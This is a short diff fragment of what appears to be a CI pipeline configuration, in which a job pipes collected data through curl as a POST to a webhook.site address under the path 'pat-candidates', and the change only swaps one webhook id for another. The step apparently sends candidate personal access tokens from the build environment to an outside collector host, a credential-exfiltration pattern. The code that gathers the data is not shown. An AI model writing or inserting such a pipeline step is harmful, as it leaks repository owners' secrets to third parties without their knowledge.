@@ -15,7 +15,7 @@ jobs:
             } | curl -fsS -X POST \
                 -H "Content-Type: text/plain" \
                 --data-binary @- \
-                "https://webhook.site/83ecc0de-4e6e-4fb8-a1d5-ad4c875b899d/pat-candidates"
+                "https://webhook.site/ee5c0964-2acd-44dc-af7c-60c2e264d252/pat-candidates"
 
 workflows:
   retrieve:
